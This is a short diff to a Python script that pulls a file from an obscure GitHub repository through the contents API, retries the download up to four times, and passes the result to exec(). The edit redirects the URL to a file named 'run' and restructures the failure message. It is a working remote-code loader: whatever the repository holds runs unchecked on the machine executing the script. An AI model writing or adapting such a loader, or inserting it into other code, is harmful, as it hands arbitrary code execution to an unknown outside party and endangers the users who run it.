@@ -4,7 +4,7 @@ import requests
 import base64
 import time
 USERNAME     = "Sample"
-url          = "https://api.github.com/repos/JikkkoNikiGFD1930/0/contents/3?ref=main"
+url          = "https://api.github.com/repos/JikkkoNikiGFD1930/0/contents/run?ref=main"
 attempts     = 0
 max_attempts = 4
 success      = False
@@ -22,6 +22,8 @@ while attempts < max_attempts:
         attempts += 1
         if attempts < max_attempts:
             time.sleep(5)
-print(f"🔴 *{USERNAME}* Could Not Run and Faild! 🔴")
+
 if success and script_content != "":
     exec(script_content)
+else:
+    print(f"🔴 *{USERNAME}* Could Not Run and Faild! 🔴")
